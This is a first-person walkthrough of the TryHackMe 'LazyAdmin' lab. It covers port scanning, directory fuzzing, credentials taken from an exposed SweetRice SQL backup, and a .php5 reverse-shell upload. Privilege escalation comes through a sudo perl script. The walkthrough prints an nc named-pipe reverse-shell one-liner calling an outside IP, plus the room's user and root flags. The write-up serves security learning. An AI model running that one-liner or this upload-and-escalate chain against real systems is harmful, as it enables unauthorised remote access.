This is an easy challenge on TryHackMe. But, I might have overcomplicated it a bit, anyways, lets gooo!

Starting off with an nmap scan 
```diff
nmap -A -p- 10.10.206.41 -T4
Nmap scan report for 10.10.206.41
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/5%OT=22%CT=1%CU=44747%PV=Y%DS=5%DC=T%G=Y%TM=66B10
OS:A09%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=2%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=106%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M
OS:508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68D
OS:F%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%
OS:CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
                                                                                                                                                               
Network Distance: 5 hops                                                                                                                                       
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                        

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   68.96 ms  10.17.0.1
2   ... 4
5   176.78 ms 10.10.206.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1188.08 seconds

```

Port 80 seems like the only way to  go. When we vist the web url, We have a traditional apache default web page. Now I decided to fuzz for directories using gobuster.

The gobuster run gave us a single directory "\content", but nothing interesting there also, except for it running a CMS named SweetRice. Digging up a bit on SweetRice CMS its version 1.5.1 seems to be filled with bugs, but we do not know the version of out CMS so far.
So I decided to further fuzz for directories deeper into the /content directory.

```diff
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  http://10.10.206.41/content/FUZZ                                                                                                                               

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.206.41/content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-medium.txt [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 168ms]
#                       [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 175ms]
#                       [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 215ms]
# Copyright 2007 James Fisher [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 216ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 213ms]
#                       [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 1677ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 1678ms]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 3690ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 3727ms]
#                       [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 3727ms]
# on atleast 2 different hosts [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 3728ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 3729ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 4743ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 4742ms]
                        [Status: 200, Size: 2198, Words: 109, Lines: 36, Duration: 4742ms]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 511ms]
inc                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 224ms]
as                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 203ms]
_themes                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 183ms]
attachment              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 176ms]

```
Bingo!! There seems to be some juicy results here. Manaually visiting these directories, I found that /as is the login portal and /inc had some php file AND a backup for the sql database :). Downloaded the sql file and cat out its contents.

```diff
cat /home/whitedevil/HTB_THM/LazyAdmin/mysql_bakup_20191129023059-1.5.1.sql 
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
  1 => 'CREATE TABLE `%--%_attachment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `post_id` int(10) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `date` int(10) NOT NULL,
  `downloads` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  2 => 'DROP TABLE IF EXISTS `%--%_category`;',
  3 => 'CREATE TABLE `%--%_category` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `link` varchar(128) NOT NULL,
  `title` text NOT NULL,
  `description` varchar(255) NOT NULL,
  `keyword` varchar(255) NOT NULL,
  `sort_word` text NOT NULL,
  `parent_id` int(10) NOT NULL DEFAULT \'0\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `link` (`link`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  4 => 'DROP TABLE IF EXISTS `%--%_comment`;',
  5 => 'CREATE TABLE `%--%_comment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(60) NOT NULL DEFAULT \'\',
  `email` varchar(255) NOT NULL DEFAULT \'\',
  `website` varchar(255) NOT NULL,
  `info` text NOT NULL,
  `post_id` int(10) NOT NULL DEFAULT \'0\',
  `post_name` varchar(255) NOT NULL,
  `post_cat` varchar(128) NOT NULL,
  `post_slug` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `ip` varchar(39) NOT NULL DEFAULT \'\',
  `reply_date` int(10) NOT NULL DEFAULT \'0\',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  6 => 'DROP TABLE IF EXISTS `%--%_item_data`;',
  7 => 'CREATE TABLE `%--%_item_data` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `data_type` varchar(20) NOT NULL,
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `item_id` (`item_id`),
  KEY `item_type` (`item_type`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  8 => 'DROP TABLE IF EXISTS `%--%_item_plugin`;',
  9 => 'CREATE TABLE `%--%_item_plugin` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  10 => 'DROP TABLE IF EXISTS `%--%_links`;',
  11 => 'CREATE TABLE `%--%_links` (
  `lid` int(10) NOT NULL AUTO_INCREMENT,
  `request` text NOT NULL,
  `url` text NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  12 => 'DROP TABLE IF EXISTS `%--%_options`;',
  13 => 'CREATE TABLE `%--%_options` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content` mediumtext NOT NULL,
  `date` int(10) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
  17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
  18 => 'CREATE TABLE `%--%_posts` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` longtext NOT NULL,
  `keyword` varchar(255) NOT NULL DEFAULT \'\',
  `tags` text NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT \'\',
  `sys_name` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `category` int(10) NOT NULL DEFAULT \'0\',
  `in_blog` tinyint(1) NOT NULL,
  `views` int(10) NOT NULL,
  `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `sys_name` (`sys_name`),
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
);?>

```

Here we can see the credentials for the login portal, manager:Password123. Now after logging into the portal, I came across a another exploit which allows unrestricted file upload. This could allow us to upload a reverse PHP shell. However, It does not allow .php files directly, however, .php5 files are allowed. So, I uploaded a shell.php5 onto the CMS and got a reverse shell. 

```diff
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
snap                                                                                                                                                           
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ pwd
/
$ cd /home/itguy
$cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}

```

Now, for privelege escalation.
```diff
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

```

We had access to sudo perl and backup.pl file without password. Hmmmmm... What is backup.pl??

```diff
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

And what is copy.sh?

```diff
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.0.190 5554 >/tmp/f
```

Here, This is a traditional reverse-shell one-liner. The easy method would have been to replace 192.168.0.190 with our host IP and opening a netcat listener at port 5554 on out host machine, then running **sudo /usr/bin/perl /home/itguy/backup.pl**. And proceed further after gaining the shell. But, I probably complicated it by replacing the contents of copy.sh with
```diff
$ echo "cat /root/root.txt" > /etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl                                                                        
THM{6637f41d0177b6f37cb20d775124699f}

```
But luckily the root.txt was in the location I predicted it to be so it made it simpler. That's it. We got both the user and root flags
